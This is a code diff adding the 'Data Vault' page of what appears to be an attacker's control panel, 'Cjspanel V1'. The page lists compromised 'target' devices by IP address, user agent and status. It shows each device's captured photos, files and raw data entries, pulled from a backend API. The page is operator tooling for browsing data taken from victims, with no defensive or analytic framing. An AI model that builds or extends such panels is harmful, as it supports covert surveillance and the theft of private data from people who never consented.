@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Vault - Cjspanel V1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --green: #00ff00; --red: #ff3b3b; --bg-dark: #0a0a0a; --bg-card: rgba(0, 20, 0, 0.8); --border: rgba(0, 255, 0, 0.3); }
+        body { font-family: 'Share Tech Mono', monospace; background: var(--bg-dark); min-height: 100vh; color: var(--green); }
+        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1000; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px); }
+        .sidebar { position: fixed; left: 0; top: 0; width: 280px; height: 100vh; background: var(--bg-card); border-right: 1px solid var(--border); padding: 20px; z-index: 100; }
+        .logo-section { text-align: center; padding: 20px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+        .logo-icon { font-size: 50px; margin-bottom: 10px; color: var(--green); filter: drop-shadow(0 0 15px var(--green)); }
+        .logo-text { font-family: 'Orbitron', sans-serif; font-size: 24px; font-weight: 900; color: var(--green); text-shadow: 0 0 20px var(--green); }
+        .nav-menu { list-style: none; }
+        .nav-link { display: flex; align-items: center; padding: 15px; color: var(--green); text-decoration: none; border: 1px solid transparent; border-radius: 5px; transition: all 0.3s ease; font-size: 13px; text-transform: uppercase; }
+        .nav-link:hover, .nav-link.active { background: rgba(0,255,0,0.1); border-color: var(--green); }
+        .nav-link.active { color: var(--bg-dark); background: var(--green); }
+        .nav-link i { margin-right: 12px; font-size: 18px; width: 24px; text-align: center; }
+        .main-content { margin-left: 280px; padding: 30px; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 20px; border-bottom: 1px solid var(--border); margin-bottom: 30px; }
+        .header-title { font-family: 'Orbitron', sans-serif; font-size: 28px; text-transform: uppercase; text-shadow: 0 0 20px var(--green); }
+        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
+        .device-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 5px; padding: 25px; transition: all 0.3s ease; cursor: pointer; text-decoration: none; color: var(--green); display: block; }
+        .device-card:hover { border-color: var(--green); box-shadow: 0 0 30px rgba(0,255,0,0.2); transform: translateY(-5px); }
+        .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .device-id { font-family: 'Orbitron', sans-serif; font-size: 14px; }
+        .device-info { font-size: 12px; color: rgba(0,255,0,0.7); line-height: 1.8; }
+        .status-badge { display: inline-block; padding: 5px 15px; border-radius: 3px; font-size: 10px; text-transform: uppercase; margin-top: 10px; }
+        .status-badge.online { background: var(--green); color: var(--bg-dark); }
+        .status-badge.offline { background: var(--red); color: white; }
+        .empty-state { text-align: center; padding: 100px; color: rgba(0,255,0,0.5); }
+        #intel-view { display: none; }
+        .back-link { display: inline-flex; align-items: center; color: var(--red); text-decoration: none; font-size: 12px; margin-bottom: 20px; cursor: pointer; }
+        .data-section { margin-bottom: 30px; }
+        .section-title { font-family: 'Orbitron', sans-serif; font-size: 14px; color: var(--red); text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; }
+        .files-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
+        .file-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 5px; padding: 15px; transition: all 0.3s ease; text-decoration: none; color: var(--green); display: block; }
+        .file-card:hover { border-color: var(--green); box-shadow: 0 0 20px rgba(0,255,0,0.2); }
+        .image-preview { width: 100%; height: 120px; object-fit: cover; border-radius: 3px; margin-bottom: 10px; border: 1px solid var(--border); }
+        .data-card { background: var(--bg-card); border: 1px solid var(--border); padding: 20px; margin-bottom: 15px; }
+        .data-content { font-size: 11px; background: rgba(0,0,0,0.3); padding: 15px; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo-section">
+            <div class="logo-icon"><i class="fa-solid fa-skull"></i></div>
+            <div class="logo-text">CJSPANEL</div>
+        </div>
+        <ul class="nav-menu">
+            <li class="nav-item"><a href="dashboard.html" class="nav-link"><i class="fa-solid fa-satellite-dish"></i> Command Center</a></li>
+            <li class="nav-item"><a href="gallery.html" class="nav-link active"><i class="fa-solid fa-database"></i> Data Vault</a></li>
+            <li class="nav-item"><a href="settings.html" class="nav-link"><i class="fa-solid fa-gear"></i> System Config</a></li>
+            <li class="nav-item"><a href="#" id="logout-btn" class="nav-link danger"><i class="fa-solid fa-power-off"></i> Terminate Session</a></li>
+        </ul>
+    </div>
+
+    <div class="main-content" id="list-view">
+        <div class="header"><h1 class="header-title"><i class="fa-solid fa-database"></i> Data Vault</h1></div>
+        <div class="devices-grid" id="devices-container"></div>
+    </div>
+
+    <div class="main-content" id="intel-view">
+        <div class="back-link" id="back-to-list"><i class="fa-solid fa-arrow-left"></i> Back to Data Vault</div>
+        <div class="header">
+            <h1 class="header-title"><i class="fa-solid fa-crosshairs"></i> Target Intel</h1>
+            <div id="device-meta" class="device-meta" style="font-size: 12px; color: rgba(0,255,0,0.6);"></div>
+        </div>
+        <div id="intel-container"></div>
+    </div>
+
+    <script type="module">
+        import CONFIG from './js/config.js';
+
+        async function loadDevices() {
+            try {
+                const res = await fetch(`${CONFIG.API_BASE_URL}/api/devices`);
+                const data = await res.json();
+                renderDeviceList(data.devices);
+            } catch (err) { console.error('Failed to load devices'); }
+        }
+
+        function renderDeviceList(devices) {
+            const container = document.getElementById('devices-container');
+            container.innerHTML = '';
+            if (devices.length === 0) {
+                container.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i><p>No captured data yet.</p></div>';
+                return;
+            }
+            devices.forEach(device => {
+                const card = document.createElement('div');
+                card.className = 'device-card';
+                card.onclick = () => showIntel(device.id);
+                card.innerHTML = `
+                    <div class="device-header">
+                        <div class="device-id"><i class="fa-solid fa-desktop"></i> ${device.id.substring(0, 16)}...</div>
+                    </div>
+                    <div class="device-info">
+                        <strong>IP:</strong> ${device.ip}<br>
+                        <strong>Agent:</strong> ${device.user_agent.substring(0, 40)}...
+                    </div>
+                    <span class="status-badge ${device.status}">${device.status}</span>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        async function showIntel(deviceId) {
+            document.getElementById('list-view').style.display = 'none';
+            document.getElementById('intel-view').style.display = 'block';
+            document.getElementById('intel-container').innerHTML = '<p>Loading intelligence data...</p>';
+
+            try {
+                // Fetch device metadata and data entries
+                const res = await fetch(`${CONFIG.API_BASE_URL}/api/device/${deviceId}/data`);
+                const data = await res.json();
+                renderIntel(data.data);
+            } catch (err) { 
+                document.getElementById('intel-container').innerHTML = '<p class="error">Failed to synchronize intel.</p>';
+            }
+        }
+
+        function renderIntel(data) {
+            const container = document.getElementById('intel-container');
+            container.innerHTML = '';
+            
+            if (data.length === 0) {
+                container.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i><p>No data captured from this target.</p></div>';
+                return;
+            }
+
+            // Group by type
+            const groups = {};
+            data.forEach(entry => {
+                if (!groups[entry.data_type]) groups[entry.data_type] = [];
+                groups[entry.data_type].push(entry);
+            });
+
+            for (const [type, entries] of Object.entries(groups)) {
+                const section = document.createElement('div');
+                section.className = 'data-section';
+                section.innerHTML = `<div class="section-title"><i class="fa-solid fa-folder-open"></i> ${type}</div>`;
+                
+                const grid = document.createElement('div');
+                grid.className = 'files-grid';
+
+                entries.forEach(entry => {
+                    if (entry.file_path) {
+                        const card = document.createElement('a');
+                        card.href = entry.file_path;
+                        card.target = '_blank';
+                        card.className = 'file-card';
+                        
+                        const isImg = entry.data_type.includes('photo') || entry.file_path.match(/\.(jpg|jpeg|png|gif)$/i);
+                        if (isImg) {
+                            card.innerHTML = `<img src="${entry.file_path}" class="image-preview" onerror="this.src='https://via.placeholder.com/150?text=Private+Data'">`;
+                        } else {
+                            card.innerHTML = `<div style="font-size:30px; margin-bottom:10px;"><i class="fa-solid fa-file"></i></div>`;
+                        }
+                        card.innerHTML += `<div class="file-name">${new Date(entry.created_at).toLocaleString()}</div>`;
+                        grid.appendChild(card);
+                    } else {
+                        const dataCard = document.createElement('div');
+                        dataCard.className = 'data-card';
+                        dataCard.innerHTML = `
+                            <div style="display:flex; justify-content:space-between; font-size:10px; margin-bottom:10px; color:var(--red)">
+                                <span>RAW_ENTRY</span>
+                                <span>${new Date(entry.created_at).toLocaleString()}</span>
+                            </div>
+                            <div class="data-content">${entry.data_content}</div>
+                        `;
+                        section.appendChild(dataCard);
+                    }
+                });
+
+                if (grid.children.length > 0) section.appendChild(grid);
+                container.appendChild(section);
+            }
+        }
+
+        document.getElementById('back-to-list').onclick = () => {
+            document.getElementById('intel-view').style.display = 'none';
+            document.getElementById('list-view').style.display = 'block';
+        };
+
+        document.getElementById('logout-btn').onclick = async () => {
+            await fetch(`${CONFIG.API_BASE_URL}/api/logout`, { method: 'POST' });
+            window.location.href = 'login.html';
+        };
+
+        loadDevices();
+    </script>
+</body>
+</html>
